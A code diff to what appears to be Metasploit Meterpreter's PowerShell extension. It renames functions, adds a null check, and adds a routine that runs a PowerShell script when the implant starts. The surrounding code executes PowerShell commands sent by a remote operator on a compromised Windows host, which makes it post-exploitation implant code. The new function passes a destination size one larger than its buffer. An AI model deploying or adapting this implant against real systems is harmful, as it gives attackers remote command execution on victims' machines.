@@ -40,7 +40,7 @@ static _AppDomainPtr gClrAppDomainInterface = NULL;
 static _AssemblyPtr gClrPowershellAssembly = NULL;
 static _TypePtr gClrPowershellType = NULL;
 
-DWORD RemoveSession(wchar_t* sessionId)
+DWORD remove_session(wchar_t* sessionId)
 {
 	HRESULT hr;
 	bstr_t bstrStaticMethodName(L"Remove");
@@ -89,7 +89,7 @@ DWORD RemoveSession(wchar_t* sessionId)
 	return (DWORD)hr;
 }
 
-DWORD InvokePSCommand(wchar_t* sessionId, wchar_t* command, _bstr_t& output)
+DWORD invoke_ps_command(wchar_t* sessionId, wchar_t* command, _bstr_t& output)
 {
 	HRESULT hr;
 	bstr_t bstrStaticMethodName(L"Execute");
@@ -99,6 +99,11 @@ DWORD InvokePSCommand(wchar_t* sessionId, wchar_t* command, _bstr_t& output)
 	variant_t vtEmpty;
 	variant_t vtCommandArg(command);
 	LONG index = 0;
+
+	if (gClrPowershellType == NULL)
+	{
+		return ERROR_INVALID_HANDLE;
+	}
 
 	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 2);
 	do
@@ -321,7 +326,7 @@ DWORD initialize_dotnet_host()
 	swprintf_s(callbackCmd, 255, L"[MSF.Powershell.Meterpreter.Core]::SetInvocationPointer(0x%p)", MeterpreterInvoke);
 	_bstr_t output;
 	dprintf("[PSH] Setting the binding callback pointer:  %S", callbackCmd);
-	InvokePSCommand(NULL, callbackCmd, output);
+	invoke_ps_command(NULL, callbackCmd, output);
 
 	return ERROR_SUCCESS;
 }
@@ -402,7 +407,7 @@ DWORD powershell_channel_write(Channel* channel, Packet* request, LPVOID context
 
 	_bstr_t output;
 
-	DWORD result = InvokePSCommand(shell->session_id, codeMarshall, output);
+	DWORD result = invoke_ps_command(shell->session_id, codeMarshall, output);
 	if (result == ERROR_SUCCESS && shell->wait_handle)
 	{
 		shell->output += output + "PS > ";
@@ -512,7 +517,7 @@ DWORD request_powershell_execute(Remote *remote, Packet *packet)
 
 			sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);
 
-			dwResult = InvokePSCommand(sessionId, codeMarshall, output);
+			dwResult = invoke_ps_command(sessionId, codeMarshall, output);
 			if (dwResult == ERROR_SUCCESS)
 			{
 				packet_add_tlv_string(response, TLV_TYPE_POWERSHELL_RESULT, output);
@@ -547,7 +552,7 @@ DWORD request_powershell_session_remove(Remote *remote, Packet *packet)
 	{
 		sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);
 
-		dwResult = RemoveSession(sessionId);
+		dwResult = remove_session(sessionId);
 
 		packet_transmit_response(dwResult, remote, response);
 	}
@@ -555,4 +560,37 @@ DWORD request_powershell_session_remove(Remote *remote, Packet *packet)
 	SAFE_FREE(sessionId);
 
 	return dwResult;
+}
+
+DWORD invoke_startup_script(LPCSTR script)
+{
+	if (script == NULL)
+	{
+		return ERROR_SUCCESS;
+	}
+
+	size_t size;
+	DWORD result = (DWORD)mbstowcs_s(&size, NULL, 0, script, 0);
+
+	if (result != ERROR_SUCCESS)
+	{
+		return result;
+	}
+
+	size++;
+	wchar_t* wideString = (wchar_t*)calloc(size, sizeof(wchar_t));
+
+	if (wideString)
+	{
+		_bstr_t output;
+		mbstowcs_s(&size, wideString, size + 1, script, size);
+
+		// ignore the output, we don't care about it during startup
+		dprintf("[PSH] calling invoke of powershell script: %S", wideString);
+		result = invoke_ps_command(NULL, wideString, output);
+		dprintf("[PSH] output of init powershell script is: %S", (wchar_t*)output);
+		free(wideString);
+	}
+
+	return result;
 }
